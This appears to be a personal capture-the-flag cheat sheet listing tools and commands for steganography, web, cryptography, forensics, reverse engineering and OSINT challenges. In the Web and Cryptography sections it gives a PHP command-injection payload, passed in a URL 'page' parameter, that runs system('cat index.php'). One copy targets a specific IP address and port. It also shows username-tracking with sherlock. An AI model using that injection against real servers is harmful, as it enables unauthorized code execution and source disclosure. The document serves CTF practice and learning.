# CTF

- [Steganography](#stenography)
  - [Steganography audio](#stenographyaudio)
- [Web](#web)
- [Cryptography](#crypto)
- [Forensics](#forensics)
- [Reverse Engineering](#rev)
- [OSINT](#osint)
- pwd

## Steganography <a name="stenography"></a>

- ```steghide --extract -sf image.jpg -p <password>```
- ```stegcracker imag.png /user/share/wordlists/rockyou.txt```
- ```file image.png```
- ```strings image.png```
- ```pngcheck image.png```
- ```sudo apt install libimage-exiftool-perl -y```
  - ```exiftool image.png```
  - ```eog image.png```
- ```xxd image.png```
  - if you see IEND chunk in exiftool use this command.
- ```find | xargs cat | grep "find"``` //if you have lot of text file then you this
  - ```grep -rni "flag{.*}"```
- Download the stegsolve.jar in any GitHub
  - ```java -jar stegsolve.jar```
  - make sure that you give the permission. 
- [ZXing Decoder](https://zxing.org/w/decode.jspx)
  - If the image is QR code image
- ```sudo apt install ruby```
  - ```sudo gem install zsteg```
  - ```zsteg image.png``` or ```zsteg  -a image.png```
  - only for png image.
- ```binwalk -e image.png```
  - ```binwalk --dd = ".*" image.png```
- ```outguess -r image.png flag.txt```
  - for the LSB.
- one more for the LSB.
  - go to ---> [jsteg](https://github.com/lukechampine/jsteg) (clone it!!)
  - open the file
  - run this command ```go run cmd/jsteg/main.go reveal ~/Desktop/image.jpg```
- [Unicode](https://330k.github.io/misc_tools/unicode_steganography.html) 
  - zero width space
- Use ```GIMP``` to work with QR dots 
- redacted text (cover with block) in a given pdf
  - ```pdftotext file.pdf``` or ```pdftohtml  file.pdf```
- suspicious space and tabs in a given text file
![image](https://github.com/Chittu13/CTF/blob/main/image/space_tab.png)
  - python script to extract and convert from binary to ASCII and get  the flag.
``` python
def extract_and_convert(file_path):
    with open(file_path, 'rb') as file:
        data = file.read()

    result = ''
    for byte in data:
        if byte == 0x09:  // Tab character
            result += '0'
        elif byte == 0x20:  // Space character
            result += '1'
    
    return result

file_path = 'the_cs_dictionary.txt'

binary_string = extract_and_convert(file_path)

n = int(binary_string, 2)
print(n.to_bytes((n.bit_length() + 7) // 8, 'big').decode())

```
## Steganography audio <a name="stenographyaudio"></a>
- [Morsecode](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
- [stegolsb](https://github.com/ragibson/Steganography.git)
  - If the audio is related to LSB
  - ```cd Steganography```
  - give the permission
  - ```python3 setup.py install```
  - ```stegolsb wavsteg -r -i file.wav -o flag.txt -n 2 -b 1000```




## Web <a name="web"></a>
- ```http://127.0.0.1:808/index.php?page=' and die(system("cat index.php")) or ' ```
  - if you want to read the index.php use this payload in the url "    ' and die(system("cat index.php")) or ' "
- ```curl -X POST --data hash=2196812e91c29df34f5e217cfd639881 "http://example.com:8080/admin.php"```
  - you use this if you found hash in the sorce page
- ```wget -m http://example.com:8080/```
  - here it will download the all the file in the website
  - ```grep -R "CTF{.*}"``` use this commond after download the all files

## Cryptography <a name="crypto"></a>
1. This is [Hill Cipher](https://www.dcode.fr/hill-cipher), see how it works or use an online decoder
```
-------------------------
|76 |101|115|116|101|114|
-------------------------
|32 |83 |97 |110|100|101|
-------------------------
|114|115|32 |115|104|111|
-------------------------
|117|108|100|32 |104|101|
-------------------------
|108|112|32 |121|111|117|
-------------------------
|32 |58 |41 |41 |41 |42 |
-------------------------

KLZCOUKTVOUWUKDOBGZVJIIIRGVHXCRQUCNOX_IBBL 
```
![image](https://github.com/Chittu13/CTF/blob/main/image/hill_cipher.png)
  - flag ```CTF{BTW_EXISTS_AN_INTERESTING_FILM_ABOUT_HILLS}```
2. http://62.173.140.174:46005/index.php?page=' and die(system("cat index.php")) or '
    - if the web is old version use this in the url
3. Replace small letters with A, capital letters with B
    - ```BA BAAB AAABABAAAAABB AAA BBBBAA BBABAAA BA ABBABAAAB AABAAAA AB AAAAAA AABABB BBAABBABBAABA```
    - [bacon-cipher](https://www.dcode.fr/bacon-cipher)
## Forensics <a name="forensics"></a>
- [outer space audio](https://github.com/colaclanth/sstv.git)
  - ```sudo python3 setup.py install```
  - ```sstv -d file.wav -o result.png```
  - if the hit is related about SSTV(slow scan TV)
- ```strings flag.zip | grep -i cit | sort | uniq -u```
  - Given zip file was numerous directories with a flag.txt
- A simple script to converts the RGB values of each pixel into characters
```python
 from PIL import Image
import numpy as np

image_path = './secret_square.png'
img = Image.open(image_path).convert('RGB')

pixels = np.array(img)
print(pixels.shape)

sums = np.sum(pixels, axis=2)
print(sums.shape)

for row in sums:
    print(''.join([chr(x) for x in row]))
```

## Reverse Engineering <a name="rev"></a>
- ```ltrace ./filename```
  - The file is executable_file so we use ./filename
- ```strace ./filename```
- [ghidra](https://github.com/NationalSecurityAgency/ghidra/releases)
  - Download the zip file from the above line```hidra_11.0.3_PUBLIC_20240410.zip```

## OSINT <a name="osint"></a>
- To find the user in the internet use this tool called sherlock
```bash
# clone the repo
$ git clone https://github.com/sherlock-project/sherlock.git

# change the working directory to sherlock
$ cd sherlock

# install the requirements
$ python3 -m pip install -r requirements.txt
$ python3 sherlock user123
```
